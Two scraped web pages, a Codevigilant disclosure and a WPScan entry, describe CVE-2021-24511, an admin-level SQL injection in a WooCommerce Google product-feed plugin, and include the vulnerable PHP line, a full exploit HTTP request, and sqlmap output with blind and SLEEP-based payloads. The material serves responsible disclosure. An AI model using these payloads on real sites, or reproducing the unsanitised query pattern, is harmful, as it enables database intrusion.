=== Content from codevigilant.com_5fd350cc_20250114_213308.html ===

[![](/banner.png)](https://codevigilant.com/)

* [Home](/)
* [Disclosure](/disclosure/)
  + [INJECTION](/category/injection/)
  + [CROSS-SITE SCRIPTING (XSS)](/category/cross-site-scripting-xss/)
  + [INFORMATION DISCLOSURE](/category/information-disclosure/)
  + [LOCAL FILE INCLUSION](/category/local-file-inclusion/)
  + [SSRF/XSPA](/category/ssrf/)
  + [COMPONENTS WITH KNOWN VULNERABILITIES](/category/components-with-known-vulnerabilities/)
  + [UNVALIDATED REDIRECTS AND FORWARDS](/category/unvalidated-redirects-and-forwards/)
* [Blog](/blog/)
* [RSS Feed](/index.xml)
* [About Team](/about-team/)

Wp Plugin Purple Xmls Google Product Feed for Woocommerce
### Plugin Details

Plugin Name: [wp-plugin : purple-xmls-google-product-feed-for-woocommerce](https://wordpress.org/plugins/purple-xmls-google-product-feed-for-woocommerce/)
Effected Version : 3.3.0.3 (and most probably lower version's if any)
Vulnerability : [Injection](/category/injection/)
Minimum Level of Access Required : Administrator
CVE Number : CVE-2021-24511
Identified by : [Syed Sheeraz Ali](/author/syed_sheeraz_ali/)
[WPScan Reference URL](https://wpscan.com/plugin/purple-xmls-google-product-feed-for-woocommerce/)
### Disclosure Timeline

* May 9, 2021: Issue Identified and Disclosed to WPScan
* May 31, 2021 : Plugin Updated
* June 10, 2021 : CVE Assigned
* August 22, 2021 : Public Disclosure

### Technical Details

Vulnerable File: `/core/ajax/wp/fetch_product_ajax.php#352`

Vulnerable Code block and parameter:

Administrator level SQLi for parameter `product_id`

Vulnerable Code: [/core/ajax/wp/fetch\_product\_ajax.php#352](https://plugins.trac.wordpress.org/browser/purple-xmls-google-product-feed-for-woocommerce/trunk/core/ajax/wp/fetch_product_ajax.php?rev=2172760#352)

```
352:        $check = $wpdb->get_row("SELECT COUNT(product_id) as count FROM $table_name WHERE product_id = " . sanitize_text_field($_POST['product_id']));

```

[Fixed Commit: https://plugins.trac.wordpress.org/changeset/2532093/](https://plugins.trac.wordpress.org/changeset/2532093/)

## PoC Screenshots

![PoC Screenshot](/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot1.png)
![PoC Screenshot](/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot2.png)
![PoC Screenshot](/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot3.png)
![PoC Screenshot](/disclosure_screenshots/purple-xmls-google-product-feed-for-woocommerce_screenshot4.png)

## Steps to reproduce

we do not know how to reach this Parameter from the UI so these are the steps how we reched it after code review.
install woocommrece and this plugin then go to create feed go to custom product feed and search something capture the requst in burp
change the q params value to given value savep and add these two params with it id Parameter will have a sqli.

```
&q=savep&local_cat_ids=1&product_id=1

```
#### Exploit

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 172.28.128.50
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-GPC: 1
Origin: http://172.28.128.50
Referer: http://172.28.128.50/wp-admin/admin.php?page=cart-product-feed-admin
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1620443683%7C2MZuCYsK7cynrQu2tWF9whgE1vtkxLnVPFHiGsJ9Fi0%7C1471328ee46323d87aa594ee1c6acb9ed6f70fbc9942f0148ff45ad621d76e57; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3AiQVT6EvbuCedvp65Wb1%2BuUEl; PHPSESSID=d8f8beced189cdd7cb849dedbb8a8383; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1620443683%7C2MZuCYsK7cynrQu2tWF9whgE1vtkxLnVPFHiGsJ9Fi0%7C1ae6e450dc0b415e0d67668228afb2a7317b368b4ef2f0d49e6cbb4b71a6a811; wp-settings-time-1=1620279779
Connection: close

keyword=eewr&searchfilters=sku&security=c3b54163aa&action=cpf_cart_product&feedpath=core%2Fajax%2Fwp%2Ffetch_product_ajax.php&q=savep&local_cat_ids=1&product_id=1

```
```
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: product_id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: keyword=eewr&searchfilters=sku&security=c3b54163aa&action=cpf_cart_product&feedpath=core/ajax/wp/fetch_product_ajax.php&q=savep&local_cat_ids=1&product_id=1 AND 6853=6853

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: keyword=eewr&searchfilters=sku&security=c3b54163aa&action=cpf_cart_product&feedpath=core/ajax/wp/fetch_product_ajax.php&q=savep&local_cat_ids=1&product_id=1 AND (SELECT 7403 FROM (SELECT(SLEEP(5)))gJUc)
---
[11:44:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[11:44:42] [INFO] fetching current user
[11:44:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:44:42] [INFO] retrieved: bob@localhost
current user: 'bob@localhost'

[*] ending @ 11:44:46 /2021-05-06/

```

---

Â© [Anant Shrivastava](https://anantshri.info)
2023



=== Content from wpscan.com_709e6c36_20250114_213309.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Create WooCommerce Product Feeds For 40+ Merchants < 3.3.1.0 - Authenticated SQL Injection

### Description

The fetch\_product\_ajax functionality in the plugin uses a `product\_id` POST parameter which is not properly sanitised, escaped or validated before inserting to a SQL statement, leading to SQL injection.

### Proof of Concept

POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Length: 162
Accept: \*/\*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-GPC: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [admin+]
Connection: close
keyword=eewr&searchfilters=sku&security=c3b54163aa&action=cpf\_cart\_product&feedpath=core%2Fajax%2Fwp%2Ffetch\_product\_ajax.php&q=savep&local\_cat\_ids=1&product\_id=1%20AND%20(SELECT%207403%20FROM%20(SELECT(SLEEP(5)))gJUc)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

purple-xmls-google-product-feed-for-woocommerce](https://a8cteam5105.wordpress.com/plugin/purple-xmls-google-product-feed-for-woocommerce/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.3.1.0

### References

CVE
[CVE-2021-24511](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24511)

URL
<https://codevigilant.com/disclosure/2021/wp-plugin-purple-xmls-google-product-feed-for-woocommerce/>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[6.7 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L)

### Miscellaneous

Original Researcher
Syed Sheeraz Ali of Codevigilant

Verified
Yes

WPVDB ID
[0fa114a0-29df-4312-9138-eb9f0aedb3c5](https://a8cteam5105.wordpress.com/vulnerability/0fa114a0-29df-4312-9138-eb9f0aedb3c5/)

### Timeline

Publicly Published
2021-08-22 (about 3 years ago)

Added
2021-08-23 (about 3 years ago)

Last Updated
2022-04-09 (about 2 years ago)

### Other

Published
Title

Published
2024-01-03
Title
[Randomize <= 1.4.3 - Authenticated (Contributor+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/139e1581-a5bf-41b0-84a2-a651e95df825/)

Published
2023-10-30
Title
[Wp photo text slider 50 < 8.1 - Authenticated (Subscriber+) SQL Injection via Shortcode](https://a8cteam5105.wordpress.com/vulnerability/cb090ddf-c309-47c8-adab-b990e6383307/)

Published
2022-12-24
Title
[Conditional Payment Methods for WooCommerce <= 1.0 - Admin+ SQLi](https://a8cteam5105.wordpress.com/vulnerability/fe1514b4-74e1-4c19-8741-c0d4db9bab99/)

Published
2017-08-14
Title
[I Recommend This <= 3.8.1 - Authenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/af7aa0c4-d7a7-4712-a54d-5caefd2edab4/)

Published
2014-08-01
Title
[Event Registration <= 5.44 - SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/987f00c2-1e32-464a-988c-5fde46a6801a/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

